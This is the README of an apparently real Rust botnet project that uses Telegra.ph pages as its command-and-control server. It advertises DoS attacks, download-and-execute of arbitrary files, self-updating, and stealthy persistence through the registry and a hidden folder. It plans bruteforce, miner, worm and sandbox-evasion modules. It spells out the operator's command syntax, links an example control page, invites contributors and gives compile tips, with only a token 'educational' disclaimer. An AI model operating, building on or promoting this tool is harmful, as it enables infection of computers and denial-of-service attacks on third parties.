# Rust Botnet
Example botnet client which uses Telegra.ph as C&C server.

## Features
* DoS attack feature.
* Loader & Executer of any files.
* Update feature.
* Program adds itself to autoload register and moves to hidden folder in C:/ drive root.
* Botnet deletion by command.

### In development
* Bruteforce module.
* Sandbox & Virtual machine detector.
* Admin notification about new client.
* Miner module.
* Worm module.
* C&C server link / commands encryption.
* New module-based core architecture.
* Show message box to client.

Notice, that this is not production ready version. 
There are many bugs which are waiting to fix.

## Example & List of commands
Example of C&C server [here](https://telegra.ph/Cls93sog103ekfSfKTEsto294kfaozwkd394-rktkcsd-krfasseegpe11-03-20).
Botnet uses next syntax - `command{split}value` or `command{split}value{sep}value's_value`
### Available commands
* `download_exec{split}LINK_TO_FILE` - download and run file which is located at LINK_TO_FILE
* `ddos{split}TARGET{sep}TIME` - ddos TARGET for TIME seconds
* `upgrade{split}LINK_TO_FILE{sep}VERSION` - download and install botnet update which located at LINK_TO_FILE. Update will be installed only if botnet's file version is lower than VERSION
* `stop{split}` - you should use that command every time after executing other's ones
* `delete_botnet{split}` - delete botnet exe and it's registry notes from client's PC
* `exit{split}` - close botnet's executive file

## Help
If you need any help at all, feel free to post a issue.
 
## Contributing
Contributing is encouraged and will help make a better program. Please refer to [this](https://gist.github.com/MarcDiethelm/7303312) before contributing.

## Disclaimer
This program must be used for educational purposes only!
I am not responsible for anything you do with it.

## License
This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/Ookldev/rust_botnet/blob/master/LICENSE) file for details

P.S. Better use i686-pc-windows-msvc to compile it.
